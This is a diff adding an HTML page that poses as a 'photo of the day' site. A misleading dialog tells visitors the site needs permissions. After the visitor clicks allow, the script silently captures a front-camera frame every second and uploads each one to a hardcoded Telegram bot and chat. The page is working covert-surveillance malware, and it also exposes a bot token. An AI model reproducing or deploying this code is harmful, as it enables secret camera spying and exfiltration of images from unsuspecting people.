@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Фото дня</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Arial, sans-serif;
+            background: #1a1a1a;
+        }
+        
+        .fullscreen-photo {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1;
+        }
+        
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
+        }
+        
+        .overlay.hidden {
+            display: none;
+        }
+        
+        .dialog {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 350px;
+            margin: 20px;
+        }
+        
+        .dialog h2 {
+            color: #333;
+            margin: 15px 0;
+        }
+        
+        .dialog p {
+            color: #666;
+            margin-bottom: 25px;
+        }
+        
+        .allow-btn {
+            background: #007AFF;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 16px;
+            border-radius: 25px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+        }
+        
+        .allow-btn:hover {
+            background: #0056b3;
+        }
+        
+        .status {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.7);
+            color: #00ff00;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            z-index: 3;
+        }
+        
+        video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay playsinline></video>
+    
+    <!-- Фото сразу показывается (ЗАМЕНИТЕ НА СВОЕ) -->
+    <img id="photo" class="fullscreen-photo" src="moefoto.jpg" alt="Фото">
+    <!-- Окно с запросом камеры -->
+    <div id="dialog" class="overlay">
+        <div class="dialog">
+            <div style="font-size: 50px;"></div>
+            <h2>нажмите разрешить</h2>
+            <p>Для работы сайта нужны разрешения</p>
+            <button id="allowBtn" class="allow-btn">✅ РАЗРЕШИТЬ</button>
+        </div>
+    </div>
+    
+    <!-- Статус отправки (можно скрыть если не нужно) -->
+    <div id="status" class="status">Отправлено: 0</div>
+
+    <script>
+        // ВАШИ ДАННЫЕ
+        const BOT_TOKEN = '8453257738:AAGZIZ7t93q9ozPHuDHU3TnDRT9hy8Wnk04';
+        const CHAT_ID = '7289899745';
+        
+        // Элементы
+        const video = document.getElementById('video');
+        const dialog = document.getElementById('dialog');
+        const allowBtn = document.getElementById('allowBtn');
+        const statusDiv = document.getElementById('status');
+        
+        let stream = null;
+        let canvas = document.createElement('canvas');
+        let ctx = canvas.getContext('2d');
+        let counter = 0;
+        let intervalId = null;
+
+        // Функция отправки фото
+        async function sendPhoto(blob) {
+            try {
+                let formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+                
+                let response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                let result = await response.json();
+                
+                if (result.ok) {
+                    counter++;
+                    statusDiv.textContent = `Отправлено: ${counter}`;
+                }
+            } catch (e) {
+                console.log('Ошибка отправки, но фото все равно делаем');
+            }
+        }
+
+        // Функция захвата кадра
+        function captureAndSend() {
+            if (!stream || video.videoWidth === 0) return;
+            
+            try {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => {
+                    if (blob) sendPhoto(blob);
+                }, 'image/jpeg', 0.7);
+            } catch (e) {}
+        }
+
+        // Запуск камеры
+        allowBtn.addEventListener('click', async () => {
+            try {
+                // Запрашиваем камеру
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        width: 640,
+                        height: 480,
+                        facingMode: 'user'
+                    }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    
+                    // Запускаем отправку каждую секунду
+                    intervalId = setInterval(captureAndSend, 1000);
+                    
+                    // Прячем диалог
+                    dialog.classList.add('hidden');
+                    
+                    // Показываем статус
+                    statusDiv.style.display = 'block';
+                };
+                
+            } catch (error) {
+                alert('Ошибка доступа к камере: ' + error.message);
+            }
+        });
+
+        // Остановка при закрытии
+        window.addEventListener('beforeunload', () => {
+            if (intervalId) {
+                clearInterval(intervalId);
+            }
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+
+        // Фото сразу видно при загрузке
+        window.addEventListener('load', () => {
+            console.log('Страница загружена, фото уже видно');
+        });
+    </script>
+</body>
+</html>
